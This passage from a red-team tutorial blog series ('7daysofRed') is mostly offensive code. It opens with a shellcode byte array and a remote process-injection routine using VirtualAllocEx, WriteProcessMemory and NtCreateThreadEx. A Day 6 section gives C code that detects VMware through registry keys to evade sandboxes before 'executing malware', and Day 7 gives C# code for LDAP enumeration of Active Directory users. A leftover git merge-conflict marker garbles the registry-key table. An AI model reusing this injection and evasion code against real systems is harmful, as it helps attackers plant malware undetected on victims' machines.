<span class="s">"</span><span class="se">\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x85\x08\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x53\x68\x65</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6c\x6c\x63\x6f\x64\x65\x00\x53\x75\x63\x63\x65\x73\x73\x00</span><span class="s">"</span><span class="p">;</span>


<span class="n">HANDLE</span> <span class="n">hthread</span><span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
<span class="n">DWORD</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="n">HANDLE</span> <span class="n">hProc</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span><span class="n">FALSE</span><span class="p">,</span><span class="n">pid</span><span class="p">);</span>
<span class="n">VOID</span> <span class="o">*</span><span class="n">payload</span><span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span><span class="n">MEM_COMMIT</span><span class="o">|</span><span class="n">MEM_RESERVE</span><span class="p">,</span><span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="n">shellcode</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span><span class="nb">NULL</span><span class="p">);</span>
<span class="n">NtCreateThreadEx</span> <span class="n">pNtCreateThreadEx</span> <span class="o">=</span> <span class="p">(</span><span class="n">NtCreateThreadEx</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span><span class="s">"NtCreateThreadEx"</span><span class="p">);</span>
<span class="n">pNtCreateThreadEx</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hthread</span><span class="p">,</span><span class="n">GENERIC_ALL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">hProc</span><span class="p">,(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">payload</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">FALSE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>
<h5 id="day6">DAY6</h5>
<h3 id="sandbox-evasion-by-enumerating-the-existence-of-registry-keys">Sandbox Evasion by Enumerating the Existence of Registry Keys</h3>

<p>As stated on Day 3, sandbox evasion is a fundamental apart of any attacker’s strategy to infilrate a network. The chance of a piece of malware touching a virtual environment is extremely high since most host antivirus and email antivirus programs utilize a sandbox. In order for an attacker to identify a virtual environment they will employ a series of checks included in their stage 0 payload. In this post we’ll discuss enumerating registry keys and checking for artifacts to indicate a virtual environment.There are a number of virtual environment software such as VMware,VirtualBox,Sandboxie,Wine,Xen and many more. For each of these environments there are registry keys identifying them and their particular settings. For Example:</p>

<p>«««&lt; HEAD
 VMWare:</p>

<h1 id="-hklmsystemcurrentcontrolsetenumpciven_15ad--------------------">| HKLM\SYSTEM\CurrentControlSet\Enum\PCI\VEN_15AD              |      |</h1>
<h4 id="vmware">VMWare:</h4>

<p>| HKLM\SYSTEM\CurrentControlSet\Enum\PCI\VEN_15AD*             |      |</p>
<blockquote>
  <blockquote>
    <blockquote>
      <blockquote>
        <blockquote>
          <blockquote>
            <blockquote>
              <p>63d34e1a1a2bec6a9bb93652e9e00837b3b51c07
| ———————————————————— | —- |
| HKCU\SOFTWARE\VMware, Inc.\VMware Tools                      |      |
| HKLM\SOFTWARE\VMware, Inc.\VMware Tools                      |      |
| HKLM\SYSTEM\ControlSet001\Services\vmdebug                   |      |
| HKLM\SYSTEM\ControlSet001\Services\vmmouse                   |      |
| HKLM\SYSTEM\ControlSet001\Services\VMTools                   |      |
| HKLM\SYSTEM\ControlSet001\Services\VMMEMCTL                  |      |
| HKLM\SYSTEM\ControlSet001\Services\vmware                    |      |
| HKLM\SYSTEM\ControlSet001\Services\vmci                      |      |
| HKLM\SYSTEM\ControlSet001\Services\vmx86                     |      |
| HKLM\SYSTEM\CurrentControlSet\Enum\IDE\CdRomNECVMWar_VMware_IDE_CD* |      |
| HKLM\SYSTEM\CurrentControlSet\Enum\IDE\CdRomNECVMWar_VMware_SATA_CD* |      |
| HKLM\SYSTEM\CurrentControlSet\Enum\IDE\DiskVMware_Virtual_IDE_Hard_Drive* |      |
| HKLM\SYSTEM\CurrentControlSet\Enum\IDE\DiskVMware_Virtual_SATA_Hard_Drive* |      |</p>
            </blockquote>
          </blockquote>
        </blockquote>
      </blockquote>
    </blockquote>
  </blockquote>
</blockquote>

<p>*Credits to Checkpoint Security for the Table</p>

<p>You can query these keys using RegOpenKeyEx,RegOpenKey,RegQueryValue,RegQueryValueEx ,RegCloseKey and RegEnumKey and confirm the existence of these keys, if they don’t exist you can continue running malware.If they do exist however you can make  your malware take another code path so it doesn’t get detected. You can often run the same routine of checks again after a certain amount of time has pasted to see if your still in the same virtual environment or if you’re on a actual host. The following code takes two of the registry key checks for VMWare and checks if they exist, if they exist the thread goes to sleep and checks again until the the check returns false.</p>

<p>Code:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
  <span class="n">HKEY</span> <span class="n">hPrincipalKey</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Running Two checks for VMware environment....</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">LSTATUS</span> <span class="n">success</span> <span class="o">=</span> <span class="n">RegOpenKeyEx</span><span class="p">(</span><span class="n">HKEY_CURRENT_USER</span><span class="p">,</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"SOFTWARE</span><span class="se">\\</span><span class="s">VMware, Inc.</span><span class="se">\\</span><span class="s">VMware Tools"</span><span class="p">),</span><span class="mi">0</span><span class="p">,</span><span class="n">KEY_READ</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hPrincipalKey</span><span class="p">);</span>
  <span class="k">while</span><span class="p">(</span><span class="n">success</span><span class="o">==</span><span class="n">ERROR_SUCCESS</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Key was successfully opened at 0x%p,SLEEPING</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">hPrincipalKey</span><span class="p">);</span>
        <span class="n">Sleep</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>

    <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"The key did not open ,executing malware</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
   <span class="n">Sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>


<span class="n">LSTATUS</span> <span class="n">success2</span> <span class="o">=</span> <span class="n">RegOpenKeyEx</span><span class="p">(</span><span class="n">HKEY_CURRENT_USER</span><span class="p">,</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">SYSTEM</span><span class="se">\\</span><span class="s">ControlSet001</span><span class="se">\\</span><span class="s">Services</span><span class="se">\\</span><span class="s">VMTools"</span><span class="p">),</span><span class="mi">0</span><span class="p">,</span><span class="n">KEY_READ</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hPrincipalKey</span><span class="p">);</span>
  <span class="k">while</span><span class="p">(</span><span class="n">success2</span><span class="o">==</span><span class="n">ERROR_SUCCESS</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Key was successfully opened at 0x%p,SLEEPING</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">hPrincipalKey</span><span class="p">);</span>
        <span class="n">Sleep</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>


    <span class="p">}</span>

   <span class="n">printf</span><span class="p">(</span><span class="s">"The key did not open ,executing malware</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
   <span class="n">Sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>



<span class="p">}</span>

</code></pre></div></div>
<h2 id="day7">Day7</h2>
<h2 id="active-directory-enumeration-with-ldap-queries">Active Directory Enumeration with LDAP queries</h2>

<p>For the last day of 7daysofRed, we’re going to be covering LDAP queries.These are used in almost every Active Directory enumeration tool, such as PowerView and BloodHound. In an Active Directory environment there are several protocols that are used in order to transmit data ,two of the major ones being  Kerberos and LDAP. Since we are addressing LDAP in this post, Kerberos is out of scope for now. LDAP stands for Lightweight Directory Access Protocol, and its server is usually hosted on a domain controller. A domain controller is where all your data for every domain user ,group and host lives in the form of objects,and ntds.dit being the Active Directory Database file is also stored in the domain controller. LDAP is usually used to query these objects from the domain controller through the use of LDAP queries. In most cases once you have access to any authenticated user on a network, you can query the domain controller through LDAP. Having a look at LDAP user search request in wireshark may shed some light on what’s going on when you send a query out to a domain controller.</p>

<p><img src="https://user-images.githubusercontent.com/55005881/113821379-06a85000-974a-11eb-975f-d4eb4383b8ef.png" alt="image" /></p>

<p>In this capture you can see the search base or domain where the query is to be constrained to, “dc=ragee,dc=local”. You can also see that the scope requested was the wholeSubtree,which indicates that the search base and all entries under it will be included in the search results.The next revelant field would be the filter, which constrains the search results even further and only specifies a certain user. The filter here is <code class="highlighter-rouge">(&amp;(samAccountName=user001)(objectClass=*)</code>, and its filtering the inital results for user001 and returning all the user attributes associated with that user.The attributes requested are listed under that in the attributes section.This is the response to this query:</p>

<p><img src="https://user-images.githubusercontent.com/55005881/113821405-0dcf5e00-974a-11eb-8dd8-631ef59c1454.png" alt="image" /></p>

<p>As you can see the information was returned for each user attribute requested for the user user001.</p>

<p><em>Code: Performs a basic LDAP query with a domain user account name as an argument.</em></p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.DirectoryServices</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.DirectoryServices.ActiveDirectory</span><span class="p">;</span>



<span class="k">namespace</span> <span class="nn">GetDomainUsers</span>
<span class="p">{</span>
    <span class="k">class</span> <span class="nc">Program</span>
    <span class="p">{</span>
       
        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="kt">string</span> <span class="n">user</span> <span class="p">=</span> <span class="n">args</span><span class="p">[</span><span class="m">0</span><span class="p">];</span>
            <span class="k">try</span>
            <span class="p">{</span>
                <span class="n">Domain</span> <span class="n">domain</span> <span class="p">=</span> <span class="n">Domain</span><span class="p">.</span><span class="nf">GetCurrentDomain</span><span class="p">();</span>
                

                <span class="c1">//Create Ldap connection object</span>
                <span class="n">DirectoryEntry</span> <span class="n">ldapconn</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">DirectoryEntry</span><span class="p">(</span><span class="s">"LDAP://"</span><span class="p">+</span><span class="n">domain</span><span class="p">.</span><span class="n">Name</span><span class="p">);</span>
                
                <span class="c1">//Create ldap searcher</span>
                <span class="n">DirectorySearcher</span> <span class="n">searcher</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">DirectorySearcher</span><span class="p">(</span><span class="n">ldapconn</span><span class="p">);</span>
                <span class="c1">//Attach ldapquery filter</span>
                <span class="n">searcher</span><span class="p">.</span><span class="n">Filter</span><span class="p">=</span><span class="s">"(&amp;(objectClass=user)(sAMAccountName="</span><span class="p">+</span><span class="n">user</span><span class="p">+</span><span class="s">"))"</span><span class="p">;</span>
                <span class="c1">//Gets Result</span>
                <span class="n">SearchResult</span> <span class="n">result</span> <span class="p">=</span> <span class="n">searcher</span><span class="p">.</span><span class="nf">FindOne</span><span class="p">();</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="n">ResultPropertyCollection</span> <span class="n">fields</span> <span class="p">=</span> <span class="n">result</span><span class="p">.</span><span class="n">Properties</span><span class="p">;</span>
                    <span class="k">foreach</span><span class="p">(</span><span class="n">String</span> <span class="n">ldapField</span> <span class="k">in</span> <span class="n">fields</span><span class="p">.</span><span class="n">PropertyNames</span><span class="p">)</span>
                    <span class="p">{</span>
                        <span class="k">foreach</span><span class="p">(</span><span class="n">Object</span> <span class="n">myCollection</span> <span class="k">in</span> <span class="n">fields</span><span class="p">[</span><span class="n">ldapField</span><span class="p">])</span>
                        <span class="p">{</span>
                            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"{0,-20} : {1}"</span><span class="p">,</span>
                                <span class="n">ldapField</span><span class="p">,</span> <span class="n">myCollection</span><span class="p">.</span><span class="nf">ToString</span><span class="p">()));</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="k">else</span>
                <span class="p">{</span>
                    <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"User Doesn't Exist"</span><span class="p">);</span>
                <span class="p">}</span>

                

                <span class="c1">//</span>

            <span class="p">}</span>
            <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"Problem Connecting {0}"</span><span class="p">,</span> <span class="n">e</span><span class="p">.</span><span class="n">Message</span><span class="p">.</span><span class="nf">ToString</span><span class="p">());</span>
            <span class="p">}</span>
            


            

            
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div>

<p>Thanks for reading the 7daysofRed series, hopefully you learned something new or refreshed on some old details.More educational and research blog posts coming soon, so stay tuned.</p>

